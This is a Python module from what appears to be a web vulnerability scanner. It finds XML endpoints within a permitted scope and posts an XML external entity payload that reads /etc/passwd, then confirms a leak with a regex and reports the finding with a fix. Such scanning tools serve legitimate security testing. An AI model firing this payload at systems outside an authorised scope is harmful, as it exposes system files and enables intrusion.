from __future__ import annotations

import re
from urllib.parse import urlparse

from ..findings import Confidence, Finding
from .base import Context, Module

_VRT = "server_side_injection/xml_external_entity_injection_xxe"
_SIGNATURE = re.compile(r"root:.*:0:0:", re.MULTILINE)
_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    "<data>&xxe;</data>"
)
_XML_SUFFIX = (".xml", ".svc", ".asmx", ".soap", ".rss", ".wsdl")


def xxe_leak(body: str) -> bool:
    return bool(_SIGNATURE.search(body))


def _candidates(ctx: Context) -> list[str]:
    urls: list[str] = []
    seen: set[str] = set()
    for page in ctx.pages:
        path = urlparse(page.url).path.lower()
        looks_xml = (
            "xml" in page.response.content_type
            or path.endswith(_XML_SUFFIX)
            or page.response.text.lstrip()[:200].lower().startswith("<?xml")
        )
        key = page.url.split("?")[0]
        if looks_xml and key not in seen:
            seen.add(key)
            urls.append(page.url)
    return urls


class XXE(Module):
    name = "xxe"
    vrt_targets = (_VRT,)
    passive = False

    async def run(self, ctx: Context) -> None:
        for url in _candidates(ctx):
            host = urlparse(url).hostname or ""
            if not ctx.scope.permits(host, ctx._ip_for(host)):
                continue
            resp = await ctx.client.request(
                "POST", url,
                content=_PAYLOAD.encode(),
                headers={"Content-Type": "application/xml"},
            )
            if not resp.ok or not xxe_leak(resp.text):
                continue
            ctx.add(Finding(
                module=self.name,
                vrt_id=_VRT,
                title="XML external entity (XXE) injection",
                asset=ctx.asset_for(url),
                evidence="An XML external entity referencing file:///etc/passwd was resolved and returned in the response.",
                confidence=Confidence.CONFIRMED,
                request=f"POST {url}\nContent-Type: application/xml\n\n{_PAYLOAD}",
                response_excerpt=resp.text[:200],
                remediation="Disable external entity and DTD processing in the XML parser.",
                extra={"parameter": "XML body"},
            ))
